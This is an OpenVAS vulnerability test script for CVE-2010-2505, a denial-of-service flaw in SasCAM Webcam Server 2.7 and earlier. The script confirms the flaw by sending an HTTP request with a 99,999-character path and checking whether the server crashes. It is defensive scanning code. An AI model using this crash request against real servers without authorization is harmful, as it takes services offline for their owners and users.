###############################################################################
# OpenVAS Vulnerability Test
#
# SasCAM Request Processing Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901132");
  script_version("2019-05-17T12:32:34+0000");
  script_tag(name:"last_modification", value:"2019-05-17 12:32:34 +0000 (Fri, 17 May 2019)");
  script_tag(name:"creation_date", value:"2010-07-02 08:02:13 +0200 (Fri, 02 Jul 2010)");
  script_cve_id("CVE-2010-2505");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("SasCAM Request Processing Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/40214");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/13888");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("SaServer/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash the server
  process, resulting in a denial-of-service condition.");

  script_tag(name:"affected", value:"Soft SaschArt SasCAM Webcam Server 2.7 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling certain requests, which
  can be exploited to block processing of further requests and terminate the
  application by sending specially crafted requests.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running SasCam Webcam Server and is prone to denial
  of service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);

banner = get_http_banner(port:port);

if("Server: SaServer" >< banner)
{

  if(http_is_dead(port: port))
    exit(0);

  sock = http_open_socket(port);
  if(!sock)
    exit(0);

  crash = http_get( item:"/"+ crap(99999),  port:port);
  send(socket:sock, data:crash);
  http_close_socket(sock);

  if (http_is_dead(port: port))
  {
    security_message(port);
    exit(0);
  }
}

